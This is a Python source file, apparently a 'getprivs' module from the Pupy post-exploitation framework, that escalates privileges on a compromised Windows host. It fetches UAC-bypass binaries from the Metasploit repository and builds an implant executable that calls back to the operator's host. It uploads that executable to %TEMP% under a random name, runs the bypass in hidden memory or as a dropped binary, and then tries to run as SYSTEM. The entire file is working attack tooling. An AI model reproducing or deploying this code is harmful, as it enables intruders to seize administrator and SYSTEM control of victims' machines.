# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.PupyErrors import PupyModuleError
import pupygen
from urllib2 import urlopen
import os
import random
import string
import time
from modules import migrate

__class_name__="GetPrivsModule"

class GetPrivsModule(PupyModule):
	""" try to get SeDebugPrivilege for the current process """
	def __init__(self, *args, **kwargs):
		PupyModule.__init__(self,*args, **kwargs)
		self.interrupted=False
		self.mp=None

	def init_argparse(self):
		self.arg_parser=PupyArgumentParser(prog="getprivs", description=self.__doc__)
		self.arg_parser.add_argument('-e','--pupy', help='Use an alternative file')
		self.arg_parser.add_argument('-m','--method', choices=['binary','memexec'], required=True, help='UAC bypass method')

	@windows_only
	def is_compatible(self):
		pass

	def interrupt(self):
		self.info("interrupting remote process, please wait ...")
		if self.mp:
			self.mp.close()
			res=self.mp.get_stdout()
			self.log(res)

	def run(self, args):
		bypass_file=["bypassuac-x64.exe","bypassuac-x86.exe","bypassuac-x64.dll","bypassuac-x86.dll"]
		for bin in bypass_file:
			if not os.path.exists(bin):
				self.error(bin + " not found...")
				bypassuac=urlopen('https://github.com/rapid7/metasploit-framework/blob/master/data/post/'+bin+'?raw=true')
				f=open(bin,'wb')
				f.write(bypassuac.read())
				f.close()

		self.client.load_package("pupwinutils.security", force=True)

		AdminCheck=self.client.conn.modules["pupwinutils.security"].AdminCheck()

		if AdminCheck==False:
			self.info("Not ADMIN, attempting to bypassUAC")

			if args.pupy:
				with open(args.pupy,'rb') as f:
					exebuff=f.read()
				self.info("loading %s ..."%args.pupy)
			else:
				#retrieving conn info
				res=self.client.conn.modules['pupy'].get_connect_back_host()
				host, port=res.rsplit(':',1)
				#generating exe
				self.info("generating exe ...")
				if self.client.desc['proc_arch']=="64bit":
					exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
					bpuac=os.path.join(os.getcwd(),b"bypassuac-x64.exe")
				else:
					exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)
					bpuac=os.path.join(os.getcwd(),b"bypassuac-x86.exe")

			try:
				if args.method=="memexec":
					remote_path={'pupy':''}
					for i in remote_path.keys():
						remote_path[i]=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
						self.info("uploading to %s ..."%remote_path[i])

						#uploading
						rf=self.client.conn.builtin.open(remote_path[i], "wb")
						chunk_size=16000
						pos=0
						while True:
							buf=exebuff[pos:pos+chunk_size]
							if not buf:
								break
							rf.write(buf)
							pos+=chunk_size
						rf.close()
						self.success("upload successful")

					cmd=['elevate /c %s' %remote_path['pupy']]
					fork=False
					timeout= 15

					raw_pe=b""
					with open(bpuac,'rb') as f:
						raw_pe=f.read()
					
					self.client.load_package("pupymemexec")
					self.client.load_package("pupwinutils.memexec")

					self.mp=self.client.conn.modules['pupwinutils.memexec'].MemoryPE(raw_pe, args=cmd, hidden=True, redirect_stdio=False)
					self.mp.run()
					if not fork:
						starttime=time.time()
						while True:
							if self.mp.wait(1):
								break
							if timeout:
								if time.time()-starttime>timeout:
									break
						self.mp.close()

				elif args.method=="binary":
					with open(bpuac,'rb') as f:
						bpuacbuff=f.read()

					remote_path={'bypass':'','pupy':''}
					for k in remote_path.keys():
						remote_path[k]=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
						self.info("uploading %s to %s ..."%(k,remote_path[k]))
						#uploading
						rf=self.client.conn.builtin.open(remote_path[k], "wb")

						chunk_size=16000
						pos=0

						self.info("working %s ..."%k)
						while True:
							if k=='pupy':
								buf=exebuff[pos:pos+chunk_size]
							elif k=='bypass':
								buf=bpuacbuff[pos:pos+chunk_size]
							if not buf:
								break
							rf.write(buf)
							pos+=chunk_size
						rf.close()
						self.success("upload successful")

					self.client.conn.modules["pupwinutils.security"].ByPassUAC_bin(remote_path['bypass'], remote_path['pupy'])
				self.success("ADMIN stuff enabled !")

			except:
				self.error("Could not elevate privilages to ADMIN")

		try:
			self.client.conn.modules["pupwinutils.security"].RunAsSystem()
			self.success("SYSTEM stuff enabled !")
		except:
			self.error("Could not run as SYSTEM...")
